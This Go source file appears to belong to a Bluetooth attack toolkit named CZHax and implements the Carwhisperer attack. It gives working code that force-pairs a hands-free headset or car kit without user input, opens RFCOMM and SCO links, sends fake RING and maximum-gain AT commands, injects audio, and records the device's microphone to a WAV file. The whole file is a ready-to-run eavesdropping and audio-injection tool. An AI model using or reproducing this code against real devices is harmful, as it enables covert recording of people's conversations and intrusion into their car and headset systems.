package bluetooth

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

// rawSCOAddr mirrors Linux's struct sockaddr_sco:
//
//	struct sockaddr_sco { sa_family_t sco_family; bdaddr_t sco_bdaddr; };
type rawSCOAddr struct {
	Family uint16
	Addr   [6]uint8
}

// ParseBDAddr converts "AA:BB:CC:DD:EE:FF" to the little-endian byte order
// expected by sockaddr_rc / sockaddr_sco.
func ParseBDAddr(s string) ([6]byte, error) {
	var out [6]byte
	parts := strings.Split(strings.TrimSpace(s), ":")
	if len(parts) != 6 {
		return out, fmt.Errorf("invalid Bluetooth address %q", s)
	}
	for i, p := range parts {
		n, err := strconv.ParseUint(p, 16, 8)
		if err != nil {
			return out, fmt.Errorf("invalid Bluetooth address %q", s)
		}
		out[5-i] = byte(n)
	}
	return out, nil
}

// FormatBDAddr renders a little-endian address in human order.
func FormatBDAddr(addr [6]byte) string {
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
		addr[5], addr[4], addr[3], addr[2], addr[1], addr[0])
}

// Carwhisperer opens the hands-free RFCOMM channel and the SCO audio link to a
// Classic headset/car kit, injects silence (or playPath) and optionally records
// the microphone/audio stream as raw 8 kHz CVSD. It needs root or CAP_NET_ADMIN.
func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string, recordAudio bool, onLine func(string)) error {
	emit := func(format string, args ...any) {
		if onLine != nil {
			onLine(fmt.Sprintf(format, args...))
		}
	}

	_, hciName, err := hciNumber(hci)
	if err != nil {
		return err
	}
	addr, err := ParseBDAddr(address)
	if err != nil {
		return err
	}
	if err := prepareCarwhispererAdapter(hciName); err != nil {
		emit("Adapter warning: %v", err)
	}
	channel, svc, sdpErr := discoverRFCOMMChannel(address)
	if sdpErr != "" {
		emit("SDP: %s", sdpErr)
	}
	if svc != "" {
		emit("SDP: %s on RFCOMM channel %d", svc, channel)
	} else {
		emit("SDP: no hands-free service found; trying RFCOMM channel %d", channel)
	}

	var record io.Writer
	if recordAudio {
		if strings.TrimSpace(recordPath) == "" {
			recordPath = CarwhispererRecordPath(address)
		}
		if err := os.MkdirAll(filepath.Dir(recordPath), 0o700); err != nil {
			return err
		}
		w, err := newWAVWriter(recordPath)
		if err != nil {
			return fmt.Errorf("open record file: %w", err)
		}
		defer w.Close()
		record = w
	}

	var play *os.File
	if strings.TrimSpace(playPath) != "" {
		if f, err := os.Open(playPath); err == nil {
			play = f
			defer play.Close()
		} else {
			emit("Playback file unavailable: %v", err)
		}
	}

	// SCO audio needs the CVSD voice setting (0x0060).
	if _, err := exec.LookPath("hciconfig"); err == nil {
		_ = exec.Command("hciconfig", hciName, "voice", "0x0060").Run()
	}

	rfd, err := openRFCOMM(addr, channel)
	if err != nil && (errors.Is(err, unix.EACCES) || errors.Is(err, unix.ECONNREFUSED)) {
		// A refused RFCOMM channel is often an unpaired device or an SDP
		// lookup that failed for the same reason. Pair, re-read SDP, retry.
		emit("RFCOMM channel %d failed (%v); disconnecting and trying to pair %s...", channel, err, NormalizeAddr(address))
		disconnectForCW(address, emit)
		pairCarwhispererDevice(hciName, address, emit)
		if ch, svc2, perr := discoverRFCOMMChannel(address); ch > 0 {
			channel = ch
			svc = svc2
			if svc2 != "" {
				emit("SDP after pairing: %s on RFCOMM channel %d", svc2, channel)
			}
		} else if perr != "" {
			emit("SDP after pairing: %s", perr)
		}
		rfd, err = openRFCOMM(addr, channel)
	}
	if err != nil && svc == "" {
		// SDP gave us nothing. A few headsets expose HFP on a non-standard
		// channel; try a small range before giving up.
		for ch := 2; ch <= 5; ch++ {
			emit("Trying RFCOMM channel %d...", ch)
			if rfd, err = openRFCOMM(addr, ch); err == nil {
				channel = ch
				break
			}
		}
	}
	if err != nil {
		info := bluetoothInfo(address)
		if info != "" {
			emit("Device info: %s", info)
		}
		hint := "check the adapter is powered and the device is paired; CZHax needs root"
		if svc == "" {
			hint = "no hands-free (HFP/HSP) service was found; the device may be A2DP-only"
		}
		return fmt.Errorf("connect RFCOMM channel %d: %w (%s)", channel, err, hint)
	}
	defer unix.Close(rfd)
	emit("RFCOMM connected to %s", FormatBDAddr(addr))

	sfd, err := openSCO(addr)
	if err != nil {
		return fmt.Errorf("connect SCO audio: %w", err)
	}
	defer unix.Close(sfd)
	setRecvTimeout(sfd)
	emit("SCO audio connected")

	// Send the fake incoming call and maximum speaker/mic gain.
	for _, cmd := range []string{"RING\r\n", "AT+VGS=15\r\n", "AT+VGM=15\r\n", "RING\r\n"} {
		_, _ = unix.Write(rfd, []byte(cmd))
		time.Sleep(2 * time.Millisecond)
	}
	emit("Recording to %s", recordPath)

	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			_ = unix.Close(rfd)
			_ = unix.Close(sfd)
		case <-done:
		}
	}()
	defer close(done)

	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		carwhispererRFCOMM(ctx, rfd)
	}()
	go func() {
		defer wg.Done()
		carwhispererSCO(ctx, sfd, record, play, emit)
	}()
	wg.Wait()

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

func discoverRFCOMMChannel(address string) (int, string, string) {
	if _, err := exec.LookPath("sdptool"); err != nil {
		return 1, "", "sdptool not installed (install bluez-deprecated-tools)"
	}
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "sdptool", "browse", NormalizeAddr(address)).CombinedOutput()
	text := string(out)
	lowText := strings.ToLower(text)
	if strings.Contains(lowText, "failed to connect to sdp server") ||
		strings.Contains(lowText, "permission denied") {
		msg := ""
		for _, line := range strings.Split(text, "\n") {
			if strings.TrimSpace(line) != "" {
				msg = strings.TrimSpace(line)
				break
			}
		}
		if msg == "" {
			msg = "SDP lookup failed"
		}
		return 1, "", msg
	}
	if err != nil && strings.TrimSpace(text) == "" {
		return 1, "", err.Error()
	}
	service := ""
	hfp := false
	for _, raw := range strings.Split(text, "\n") {
		line := strings.TrimSpace(raw)
		if strings.HasPrefix(line, "Service Name:") {
			service = strings.TrimSpace(strings.TrimPrefix(line, "Service Name:"))
			hfp = strings.Contains(strings.ToLower(service), "handsfree") ||
				strings.Contains(strings.ToLower(service), "headset")
		}
		low := strings.ToLower(line)
		if strings.Contains(low, "0x1112") || strings.Contains(low, "0x111e") ||
			strings.Contains(low, "0x111f") || strings.Contains(low, "handsfree") ||
			strings.Contains(low, "headset") {
			hfp = true
		}
		if hfp && strings.HasPrefix(low, "channel:") {
			v := strings.TrimSpace(strings.TrimPrefix(low, "channel:"))
			if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 30 {
				return n, service, ""
			}
		}
	}
	return 1, "", ""
}

func disconnectForCW(address string, emit func(string, ...any)) {
	if _, err := exec.LookPath("bluetoothctl"); err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "bluetoothctl", "disconnect", NormalizeAddr(address)).CombinedOutput()
	if s := strings.TrimSpace(string(out)); s != "" {
		emit("disconnect: %s", s)
	}
	_ = err
}

func bluetoothInfo(address string) string {
	if _, err := exec.LookPath("bluetoothctl"); err != nil {
		return ""
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "bluetoothctl", "info", NormalizeAddr(address)).CombinedOutput()
	if err != nil && strings.TrimSpace(string(out)) == "" {
		return ""
	}
	var parts []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(line, "Name:"),
			strings.HasPrefix(line, "Paired:"),
			strings.HasPrefix(line, "Trusted:"),
			strings.HasPrefix(line, "Connected:"),
			strings.HasPrefix(line, "Class:"):
			parts = append(parts, line)
		}
	}
	return strings.Join(parts, " · ")
}

func pairCarwhispererDevice(hciName, address string, emit func(string, ...any)) {
	if _, err := exec.LookPath("btmgmt"); err == nil {
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		out, err := exec.CommandContext(ctx, "btmgmt", "-i", hciName, "pair", "-c", "NoInputNoOutput", NormalizeAddr(address)).CombinedOutput()
		cancel()
		if err == nil {
			emit("Paired with btmgmt")
			return
		}
		if strings.TrimSpace(string(out)) != "" {
			emit("btmgmt pair: %s", strings.TrimSpace(string(out)))
		}
	}
	if _, err := exec.LookPath("bluetoothctl"); err == nil {
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		out, err := exec.CommandContext(ctx, "bluetoothctl", "--agent", "NoInputNoOutput", "--timeout", "20", "pair", NormalizeAddr(address)).CombinedOutput()
		cancel()
		if err == nil {
			emit("Paired with bluetoothctl")
			_ = exec.Command("bluetoothctl", "trust", NormalizeAddr(address)).Run()
			return
		}
		if strings.TrimSpace(string(out)) != "" {
			emit("bluetoothctl pair: %s", strings.TrimSpace(string(out)))
		}
	}
}

func prepareCarwhispererAdapter(hciName string) error {
	var first error
	if _, err := exec.LookPath("rfkill"); err == nil {
		if out, err := exec.Command("rfkill", "unblock", "bluetooth").CombinedOutput(); err != nil && first == nil {
			first = fmt.Errorf("rfkill: %s", strings.TrimSpace(string(out)))
		}
	}
	if _, err := exec.LookPath("hciconfig"); err == nil {
		out, _ := exec.Command("hciconfig", hciName).CombinedOutput()
		if !strings.Contains(string(out), "UP") {
			if out2, err := exec.Command("hciconfig", hciName, "up").CombinedOutput(); err != nil && first == nil {
				first = fmt.Errorf("hciconfig %s up: %s", hciName, strings.TrimSpace(string(out2)))
			}
		}
	}
	return first
}

func openRFCOMM(addr [6]byte, channel int) (int, error) {
	if channel <= 0 || channel > 30 {
		channel = 1
	}
	fd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_STREAM, unix.BTPROTO_RFCOMM)
	if err != nil {
		return -1, fmt.Errorf("RFCOMM socket: %w", err)
	}
	setRecvTimeout(fd)
	if err := unix.Bind(fd, &unix.SockaddrRFCOMM{Channel: 0}); err != nil {
		unix.Close(fd)
		return -1, fmt.Errorf("bind RFCOMM: %w", err)
	}
	if err := unix.Connect(fd, &unix.SockaddrRFCOMM{Addr: addr, Channel: uint8(channel)}); err != nil {
		unix.Close(fd)
		return -1, err
	}
	return fd, nil
}

func openSCO(addr [6]byte) (int, error) {
	fd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_SEQPACKET, unix.BTPROTO_SCO)
	if err != nil {
		return -1, err
	}
	if err := bindSCO(fd, [6]byte{}); err != nil {
		unix.Close(fd)
		return -1, err
	}
	if err := connectSCO(fd, addr); err != nil {
		unix.Close(fd)
		return -1, err
	}
	return fd, nil
}

func bindSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_BIND, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno != 0 {
		return errno
	}
	return nil
}

func connectSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_CONNECT, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno != 0 {
		return errno
	}
	return nil
}

func setRecvTimeout(fd int) {
	tv := unix.Timeval{Sec: 0, Usec: 200000}
	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)
}

func carwhispererRFCOMM(ctx context.Context, fd int) {
	buf := make([]byte, 512)
	var pending string
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			pending += string(buf[:n])
			for {
				idx := strings.IndexByte(pending, '\n')
				if idx < 0 {
					break
				}
				line := pending[:idx]
				pending = pending[idx+1:]
				if resp := rfcommResponse(line); resp != "" {
					rfcommWrite(fd, resp)
				}
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			continue
		}
		if ctx.Err() != nil {
			return
		}
		return
	}
}

func rfcommResponse(line string) string {
	up := strings.ToUpper(strings.TrimSpace(line))
	switch {
	case up == "":
		return ""
	case strings.HasPrefix(up, "AT+BRSF="):
		return "+BRSF: 63\r\n"
	case strings.HasPrefix(up, "AT+CIND?"):
		return "+CIND: 0,1,0,0\r\n"
	case strings.HasPrefix(up, "AT+CIND=?"):
		return "+CIND: (\"call\",(0,1)),(\"service\",(0,1)),(\"call_setup\",(0-3)),(\"callsetup\",(0-3))\r\n"
	default:
		return "OK\r\n"
	}
}

func rfcommWrite(fd int, s string) {
	b := []byte(s)
	for len(b) > 0 {
		n, err := unix.Write(fd, b)
		if n > 0 {
			b = b[n:]
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(5 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}

func carwhispererSCO(ctx context.Context, fd int, record io.Writer, play *os.File, emit func(string, ...any)) {
	buf := make([]byte, 512)
	silence := make([]byte, 512)
	total := 0
	lastReport := time.Now()
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			if record != nil {
				if _, werr := record.Write(buf[:n]); werr != nil {
					emit("Record write failed: %v", werr)
					return
				}
				total += n
			}

			out := silence[:n]
			if play != nil {
				pbuf := make([]byte, n)
				if pn, _ := play.Read(pbuf); pn > 0 {
					out = pbuf[:pn]
				}
			}
			scoWrite(fd, out)
			if record != nil && time.Since(lastReport) >= 10*time.Second {
				emit("Captured %d bytes", total)
				lastReport = time.Now()
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			continue
		}
		if ctx.Err() != nil {
			return
		}
		emit("SCO read failed: %v", err)
		return
	}
}

func scoWrite(fd int, data []byte) {
	const mtu = 48
	for off := 0; off < len(data); {
		end := off + mtu
		if end > len(data) {
			end = len(data)
		}
		n, err := unix.Write(fd, data[off:end])
		if n > 0 {
			off += n
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(2 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}

// wavWriter writes 8 kHz mono 16-bit PCM and patches the RIFF sizes on close.
type wavWriter struct {
	f     *os.File
	bytes int64
}

func newWAVWriter(path string) (*wavWriter, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return nil, err
	}
	w := &wavWriter{f: f}
	if err := w.writeHeader(0); err != nil {
		f.Close()
		return nil, err
	}
	return w, nil
}

func (w *wavWriter) Write(p []byte) (int, error) {
	n, err := w.f.Write(p)
	w.bytes += int64(n)
	return n, err
}

func (w *wavWriter) Close() error {
	_ = w.writeHeader(w.bytes)
	return w.f.Close()
}

func (w *wavWriter) writeHeader(dataBytes int64) error {
	var h [44]byte
	copy(h[0:4], "RIFF")
	binary.LittleEndian.PutUint32(h[4:8], uint32(36+dataBytes))
	copy(h[8:12], "WAVE")
	copy(h[12:16], "fmt ")
	binary.LittleEndian.PutUint32(h[16:20], 16)
	binary.LittleEndian.PutUint16(h[20:22], 1)    // PCM
	binary.LittleEndian.PutUint16(h[22:24], 1)    // mono
	binary.LittleEndian.PutUint32(h[24:28], 8000) // sample rate
	binary.LittleEndian.PutUint32(h[28:32], 16000)
	binary.LittleEndian.PutUint16(h[32:34], 2)
	binary.LittleEndian.PutUint16(h[34:36], 16)
	copy(h[36:40], "data")
	binary.LittleEndian.PutUint32(h[40:44], uint32(dataBytes))
	_, err := w.f.WriteAt(h[:], 0)
	return err
}
